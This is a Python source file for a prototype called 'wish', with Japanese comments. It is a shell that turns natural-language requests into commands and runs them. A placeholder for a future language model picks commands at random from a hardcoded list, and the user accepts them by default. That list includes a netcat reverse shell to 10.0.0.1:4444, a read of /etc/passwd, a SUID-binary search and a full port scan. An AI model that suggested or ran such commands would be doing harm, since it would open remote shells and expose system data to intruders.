#!/usr/bin/env python3
import os
import sys
import subprocess
import uuid
import random
import json
from datetime import datetime

# ユーザホーム以下に .wish ディレクトリを作る
WISH_HOME = os.path.expanduser("~/.wish")
if not os.path.exists(WISH_HOME):
    os.makedirs(WISH_HOME)

HISTORY_FILE = os.path.join(WISH_HOME, "history.jsonl")


class WishState:
    DOING = "doing"
    DONE = "done"
    CANCELLED = "cancelled"


class CommandResult:
    def __init__(self, command):
        self.command = command
        self.exit_code = None
        self.stdout_file = None
        self.stderr_file = None
        self.finished_at = None

    def to_dict(self):
        return {
            "command": self.command,
            "exit_code": self.exit_code,
            "stdout_file": self.stdout_file,
            "stderr_file": self.stderr_file,
            "finished_at": self.finished_at,
        }

    @classmethod
    def from_dict(cls, dct):
        obj = cls(dct["command"])
        obj.exit_code = dct["exit_code"]
        obj.stdout_file = dct["stdout_file"]
        obj.stderr_file = dct["stderr_file"]
        obj.finished_at = dct["finished_at"]
        return obj


class Wish:
    def __init__(self, wish_text):
        self.id = uuid.uuid4().hex[:10]  # 10桁の16進ID
        self.wish_text = wish_text
        self.state = WishState.DOING
        self.command_results = []
        self.created_at = datetime.utcnow().isoformat()
        self.finished_at = None

    def to_dict(self):
        return {
            "id": self.id,
            "wish_text": self.wish_text,
            "state": self.state,
            "command_results": [cr.to_dict() for cr in self.command_results],
            "created_at": self.created_at,
            "finished_at": self.finished_at,
        }

    @classmethod
    def from_dict(cls, dct):
        w = cls(dct["wish_text"])
        w.id = dct["id"]
        w.state = dct["state"]
        w.command_results = [CommandResult.from_dict(cr) for cr in dct["command_results"]]
        w.created_at = dct["created_at"]
        w.finished_at = dct["finished_at"]
        return w


def load_history():
    wishes = []
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    data = json.loads(line)
                    wishes.append(Wish.from_dict(data))
    return wishes


def save_to_history(wish_obj):
    """Wishオブジェクトを履歴ファイルに追記する"""
    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(wish_obj.to_dict(), ensure_ascii=False) + "\n")


def overwrite_history(wishes):
    """全Wishリストを履歴ファイルに再度書き込む"""
    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
        for w in wishes:
            f.write(json.dumps(w.to_dict(), ensure_ascii=False) + "\n")


def generate_dummy_commands(wish_text):
    """
    LLM未実装の代わりに、wish_textに応じてランダムに複数コマンドを返すダミー関数。
    実際には、LLMを呼び出す or ルールベース などに置き換えてください。
    """
    dummy_pool = [
        "ls -la",
        "pwd",
        "cat /etc/passwd",
        "echo 'Hello World!'",
        "find / -perm -u=s -type f 2>/dev/null",
        "sudo nmap -p- 127.0.0.1",
        "nc -nv 10.0.0.1 4444 -e /bin/bash",
    ]
    num_commands = random.randint(1, 3)
    return random.sample(dummy_pool, num_commands)


def run_command(cmd, wish_id, cmd_index):
    """
    コマンドを実行し、stdout/stderrをファイルに保存する。
    """
    log_dir = os.path.join(WISH_HOME, wish_id, "log")
    os.makedirs(log_dir, exist_ok=True)

    stdout_file = os.path.join(log_dir, f"{cmd_index}.stdout")
    stderr_file = os.path.join(log_dir, f"{cmd_index}.stderr")

    with open(stdout_file, "wb") as out, open(stderr_file, "wb") as err:
        proc = subprocess.Popen(cmd, shell=True, stdout=out, stderr=err)
        proc.wait()

    return proc.returncode, stdout_file, stderr_file


def print_commands(commands):
    print("このコマンドをすべて実行しますか？ [Y/n]")
    for i, cmd in enumerate(commands, 1):
        print(f"[{i}] {cmd}")


def interactive_wish_creation():
    """
    新しいWishを作成し、コマンド提案～実行を行う。
    """
    wish_text = input("\nwish✨ ")
    if not wish_text.strip():
        # 空入力なら何もしない
        return None

    # コマンド生成（ダミー）
    commands = generate_dummy_commands(wish_text)
    if not commands:
        print("No commands generated.")
        return None

    wish_obj = Wish(wish_text)
    print_commands(commands)

    ans = input("\nwish❓ ").strip().lower()
    if ans == "y" or ans == "":
        # 全コマンド実行
        execute_all_commands(wish_obj, commands)
    elif ans == "n":
        # 部分実行 or 修正
        specify_or_modify_commands(wish_obj, commands)
    else:
        # 一旦同じ扱いにする
        specify_or_modify_commands(wish_obj, commands)

    # 状態更新
    if any(cr.exit_code is None for cr in wish_obj.command_results):
        # 実行されなかったコマンドがある場合→doingのまま or partial
        pass
    else:
        wish_obj.state = WishState.DONE
        wish_obj.finished_at = datetime.utcnow().isoformat()

    return wish_obj


def specify_or_modify_commands(wish_obj, commands):
    """
    実行するコマンド番号を指定 or 修正するフロー
    """
    print("そのまま実行するコマンドを `1` 、 `1,2` または `1-3` の形式で指定してください。")
    selection = input("\nwish❓ ").strip()
    if not selection:
        return

    # 例: "1,3" -> {1,3}
    to_run = set()
    for part in selection.split(","):
        if "-" in part:
            start, end = part.split("-")
            try:
                start_i = int(start)
                end_i = int(end)
                for i in range(start_i, end_i + 1):
                    if 1 <= i <= len(commands):
                        to_run.add(i)
            except ValueError:
                pass
        else:
            try:
                i = int(part)
                if 1 <= i <= len(commands):
                    to_run.add(i)
            except ValueError:
                pass

    if not to_run:
        print("実行対象が指定されませんでした。")
        return

    # 修正チェック
    print(
        f"\n[{', '.join(map(str, to_run))}] のみを実行しますか？ [Y] 修正したいコマンドがあればその番号を入力してください。"
    )
    ans = input("\nwish❓ ").strip().lower()
    if ans.isdigit():
        # 修正対象のコマンド番号
        cmd_idx = int(ans)
        if cmd_idx in to_run:
            print("\n修正内容を指示してください。")
            mod_text = input("wish❓ ").strip()
            # ここでは単純にmod_textをコマンド末尾に付け足す例にする
            # 実際には自然言語解析して書き換えなどもありうる
            old_cmd = commands[cmd_idx - 1]
            # 例: "don't use -T4" → replace など
            # 今回は超適当に末尾に "# modified"をつけるだけ
            # （本格的なパースや正規表現等はLLM実装後に検討）
            new_cmd = old_cmd.replace("-T4", "")
            if new_cmd == old_cmd:
                new_cmd += " # " + mod_text
            commands[cmd_idx - 1] = new_cmd

    # 再表示
    print("\nこのコマンドをすべて実行しますか？ [Y/n]")
    for i, cmd in enumerate(commands, 1):
        if i in to_run:
            print(f"[{i}] {cmd}")
    ans = input("\nwish❓ ").strip().lower()
    if ans == "n":
        print("実行をキャンセルしました。")
        return

    # 実行
    actual_run_commands = [(i, commands[i - 1]) for i in to_run]
    for idx, cmd in actual_run_commands:
        cmd_res = CommandResult(cmd)
        wish_obj.command_results.append(cmd_res)

        print(f"\nコマンドを実行します: {cmd}")
        rc, out_f, err_f = run_command(cmd, wish_obj.id, idx)
        cmd_res.exit_code = rc
        cmd_res.stdout_file = out_f
        cmd_res.stderr_file = err_f
        cmd_res.finished_at = datetime.utcnow().isoformat()


def execute_all_commands(wish_obj, commands):
    """
    全コマンドを順番に実行する
    """
    for i, cmd in enumerate(commands, 1):
        cmd_res = CommandResult(cmd)
        wish_obj.command_results.append(cmd_res)

        print(f"\nコマンドを実行します: {cmd}")
        rc, out_f, err_f = run_command(cmd, wish_obj.id, i)
        cmd_res.exit_code = rc
        cmd_res.stdout_file = out_f
        cmd_res.stderr_file = err_f
        cmd_res.finished_at = datetime.utcnow().isoformat()


def show_wishlist(wishes):
    """
    wishlistコマンドで、実行履歴を一覧表示する
    """
    if not wishes:
        print("まだwishがありません。")
        return

    print()
    for i, w in enumerate(wishes, 1):
        state_str = w.state
        created_at_str = w.created_at
        finished_at_str = w.finished_at if w.finished_at else ""
        print(f"[{i}] wish: {w.wish_text} (created: {created_at_str}; state: {state_str})")

    # "もっと見る場合はエンターキーを" → 今回はスキップ
    # "コマンドの経過・結果を確認したい場合は番号を入力" → 実装
    ans = input("\nwish❓ ").strip()
    if ans.isdigit():
        idx = int(ans)
        if 1 <= idx <= len(wishes):
            show_wish_detail(wishes[idx - 1])


def show_wish_detail(wish_obj):
    """
    特定のWishの詳細を表示し、コマンド一覧やログを参照できるようにする
    """
    if not wish_obj.command_results:
        print("このwishにはコマンドがありません。")
        return

    print(f"\nどのコマンドの経過・結果を確認しますか？ (1～{len(wish_obj.command_results)})")
    for i, cr in enumerate(wish_obj.command_results, 1):
        status = "done" if cr.exit_code is not None else "doing"
        print(f"[{i}] cmd: {cr.command} ({status})")

    ans = input("\nwish❓ ").strip()
    if ans.isdigit():
        cmd_idx = int(ans)
        if 1 <= cmd_idx <= len(wish_obj.command_results):
            cr = wish_obj.command_results[cmd_idx - 1]
            if cr.exit_code is None:
                print("まだ実行中、または実行されていません。")
            else:
                # ログの要約（今回は単に先頭数行だけ表示）
                print("\n--- stdout (先頭10行) ---")
                if cr.stdout_file and os.path.exists(cr.stdout_file):
                    with open(cr.stdout_file, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        for line in lines[:10]:
                            print(line, end="")

                print("\n--- stderr (先頭10行) ---")
                if cr.stderr_file and os.path.exists(cr.stderr_file):
                    with open(cr.stderr_file, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                        for line in lines[:10]:
                            print(line, end="")


def main():
    print("Welcome to wish (prototype)")
    wishes = load_history()

    while True:
        try:
            user_input = input("\n$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nBye.")
            break

        if not user_input:
            # 空行 → 新規のwishを作成するフローへ
            new_wish = interactive_wish_creation()
            if new_wish:
                wishes.append(new_wish)
                # 履歴保存
                save_to_history(new_wish)
        elif user_input == "exit":
            print("Bye.")
            break
        elif user_input == "wishlist":
            show_wishlist(wishes)
            # もし詳細変更あったら更新
            overwrite_history(wishes)
        else:
            # 何か別のコマンド → wishとして解釈
            # "wish✨ user_input" として処理
            # 例えば "scan all ports" みたいな
            wish_text = user_input
            new_wish = Wish(wish_text)
            commands = generate_dummy_commands(wish_text)
            print_commands(commands)
            ans = input("\nwish❓ ").strip().lower()
            if ans == "y" or ans == "":
                execute_all_commands(new_wish, commands)
            else:
                specify_or_modify_commands(new_wish, commands)

            # 状態更新
            if any(cr.exit_code is None for cr in new_wish.command_results):
                pass
            else:
                new_wish.state = WishState.DONE
                new_wish.finished_at = datetime.utcnow().isoformat()

            wishes.append(new_wish)
            save_to_history(new_wish)


if __name__ == "__main__":
    main()
